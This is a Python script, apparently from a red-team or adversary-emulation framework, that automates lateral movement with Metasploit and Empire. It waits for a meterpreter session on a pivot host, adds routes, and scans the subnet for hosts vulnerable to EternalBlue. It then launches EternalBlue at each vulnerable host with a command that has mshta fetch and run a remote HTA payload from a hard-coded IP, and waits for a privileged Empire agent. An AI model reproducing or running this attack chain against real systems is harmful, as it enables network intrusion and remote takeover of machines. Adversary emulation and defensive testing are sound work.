"""
This procedure script demonstrates lateral Remote Code Execution:
1. Waiting for initial meterpreter sesion from pivot node
2. Start MSF autoroute on pivot node
3. Do a vulnerable (to EternalBlue) target(s) scan
4. Launch EternalBlue thru pivot to adjacent target
5. Wait for Empire session from earlier step
"""
from c2_settings import *
from EmpireAPIWrapper import empireAPI
from pymetasploit.msfrpc import MsfRpcClient
from stage2.external_c2 import msf_wait_for_session, empire_wait_for_agent, msf_get_timestamp, empire_get_timestamp
from stage3.internal_reconn.windows import msf_eternalblue_scan
from stage3.internal_c2.windows import msf_autoroute
from stage3.escalate_privilege.windows import msf_eternal_blue

# Set both API instances for MSF & Empire
msf_API = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
empire_API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)

# Step 1 - Wait for pivot
msf_session_id = msf_wait_for_session.run(msf_API)
t = msf_get_timestamp.run(msf_API,msf_session_id)
print(t + ' Got a meterpreter session ' + str(msf_session_id))

# Step 2 - Setup autoroute on pivot
pivot_range = ''
routes = msf_autoroute.run(msf_API, msf_session_id)
t = msf_get_timestamp.run(msf_API,msf_session_id)
print(t + 'Added route(s): ' + str(routes))
for r in routes:
    if '255.255.255.0' in r: # 1-254 takes a long time to scan
        pivot_range = r.replace('.0/255.255.255.0','.100-210') 
        break # assume 1 class C network in test environment

# Step 3 - Scan for targets
t = msf_get_timestamp.run(msf_API,msf_session_id)
print(t + 'Scanning for vulnerable targets within pivot range ' + pivot_range)
targets = msf_eternalblue_scan.run(msf_API, pivot_range)

# Step 4 - Launch EB payload via pivot to target
for target_address in targets:
    cmd = 'mshta.exe http://172.30.1.57:8000/d.hta'
    t = msf_get_timestamp.run(msf_API,msf_session_id)
    msf_eternal_blue.run(msf_API, target_address, cmd)
    print(t + ' Launched EB against ' + target_address)

# Step 5 - Wait for high_integrity empire agent; 
empire_agent = empire_wait_for_agent.run(empire_API, need_privilege=True)
t = empire_get_timestamp.run(empire_API, empire_agent['name'])
print(t + ' Got Empire Agent')
print(empire_agent)